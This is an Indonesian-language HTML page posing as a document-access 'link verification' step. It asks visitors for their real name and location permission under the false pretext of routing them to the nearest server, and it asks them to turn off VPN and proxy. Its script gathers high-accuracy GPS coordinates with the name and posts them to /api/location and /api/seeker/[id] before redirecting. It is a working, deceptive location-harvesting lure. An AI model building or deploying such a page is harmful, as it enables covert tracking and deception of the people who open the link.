<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Verifikasi Link</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button, input {
      padding: 10px;
      font-size: 16px;
      margin: 5px;
    }
    button {
      background: #000;
      color: white;
      border-radius: 8px;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Verifikasi Akses Dokumen</h2>
  <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
  <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>

  <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/S.mp4" preload="auto"></audio>

  <input type="text" id="nama" placeholder="Nama Asli"><br><br>
  <button onclick="submitData()">Dapatkan Link</button>

  <script>
    const id = new URLSearchParams(window.location.search).get("id");

    function submitData() {
      const nama = document.getElementById("nama").value.trim();
      if (!nama) return alert("Nama wajib diisi.");
      if (!id) return alert("ID dokumen tidak ditemukan.");

      // Coba putar audio
      const audio = document.getElementById("audio");
      audio.play().catch((e) => {
        console.warn("Autoplay diblokir:", e);
      });

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const body = {
              nama,
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy,
              timestamp: new Date().toISOString()
            };

            // Kirim ke /api/location
            fetch("/api/location", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            }).catch((e) => console.warn("Lokasi gagal dikirim:", e));

            // Kirim ke /api/seeker/[id]
            fetch(`/api/seeker/${id}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            })
              .then((res) => res.json())
              .then((data) => {
                if (data.redirectTo) {
                  window.location.href = data.redirectTo;
                } else {
                  alert("Link tidak ditemukan.");
                }
              });
          },
          (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
          { enableHighAccuracy: true, timeout: 5000 }
        );
      } else {
        alert("Browser tidak mendukung geolokasi.");
      }
    }
  </script>
</body>
</html>
